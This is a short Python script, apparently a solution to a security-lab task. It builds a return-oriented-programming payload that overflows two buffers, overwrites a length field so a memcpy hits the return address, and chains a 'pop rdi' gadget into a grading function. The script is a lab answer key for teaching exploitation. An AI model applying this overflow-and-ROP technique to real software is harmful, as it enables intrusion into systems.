#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

POP_RDI = 0x4018A3      # 5f c3 : 从 pop %r15 的第二个字节错位取
RET     = 0x4018A4      # c3
GRADE   = 0x401677      # grade_eval
LEN     = 168           # 0xa8 = (rbp+8) - (rbp-0xa0)

payload  = struct.pack("<Q", POP_RDI)    # 写到 rbp+8 的第一个 8 字节 = 返回地址
payload += struct.pack("<Q", 4)          # rdi = 4
payload += struct.pack("<Q", RET)        # 栈对齐
payload += struct.pack("<Q", GRADE)
payload += b"A" * (256 - len(payload))   # 填满 expression[128] + logMsg[128]
payload += struct.pack("<i", LEN)        # 覆盖 f.len -> memcpy 目标 = 返回地址
sys.stdout.buffer.write(payload)